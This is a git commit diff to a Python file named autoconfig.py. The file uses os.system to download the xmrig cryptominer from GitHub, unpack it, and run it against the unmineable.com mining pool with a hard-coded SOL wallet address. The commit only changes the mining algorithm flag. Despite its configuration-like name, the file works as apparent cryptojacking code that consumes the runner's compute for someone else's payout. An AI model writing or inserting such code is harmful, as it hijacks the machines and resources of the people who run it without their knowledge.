76972d0e24ff09e9c43a9edd947fc6f7a68e25d2
fcknjudas <162876300+fcknjudas@users.noreply.github.com>
2025-02-18 16:06:31 +0300

    Update autoconfig.py

--- autoconfig.py
+++ autoconfig.py
@@ -3,4 +3,4 @@ import random
 from random import randint
 num = random.randint(1,1000000)
 os.system('wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz')
-os.system('cd xmrig-6.22.2 && ./xmrig -a gr -o stratum+ssl://rx.unmineable.com:443 -p x -u SOL:G5MFVuQvYabm9sknjwXi9HcHVLGYnEdiQcsQ3NASP1W3.tothemoonRX{num}#8s32-cp81')
+os.system('cd xmrig-6.22.2 && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -p x -u SOL:G5MFVuQvYabm9sknjwXi9HcHVLGYnEdiQcsQ3NASP1W3.tothemoonRX{num}#8s32-cp81')
